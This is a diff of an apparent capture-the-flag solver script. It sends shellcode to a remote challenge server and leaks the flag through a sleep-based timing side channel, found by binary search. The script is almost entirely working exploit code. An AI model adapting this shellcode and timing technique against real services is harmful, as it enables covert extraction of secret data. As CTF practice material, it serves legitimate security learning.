@@ -491,7 +491,54 @@ for i in range(400):
         print(flag)
         if chr(k) == '}' : exit(0)
 
+# get flag by binary search
 """
+flag = ""
 
+for i in range(50):
+    l = 0
+    r = 0xffffffffffffffff
+    while l < r :
+        try:   
+            print(hex(l), hex(r))
+            #p = process(binary)
+            p = remote('3.38.198.197', 54321)
+            offset = 0x4000 - 0x1572 + 0x2e
+            mid = (l + r) // 2
+            payload = f'''
+                pop r10
+                add r10, {offset + 8 * i}
+                mov rax, QWORD ptr [r10]
+                mov r11, {mid}
+                cmp rax, r11
+                ja skip_sleep
+
+                push 0
+                push 2
+                mov rdi, rsp
+                mov rax, 35
+                syscall
+
+            skip_sleep:
+                mov rax, 60
+                mov rdi, 0
+                syscall
+            '''
+            p.sendafter(b': ', asm(payload))
+            start = datetime.now()
+            p.recvline()
+            p.recvline()
+        except:
+            end = datetime.now()
+            p.close()
+        t = (end-start).total_seconds()
+        if t > 1.5 : 
+            r = mid
+        else :
+            l = mid + 1
+
+    flag += p64(l).decode()
+    print(flag)
+    if '}' in flag : exit(0)
 """
 ```
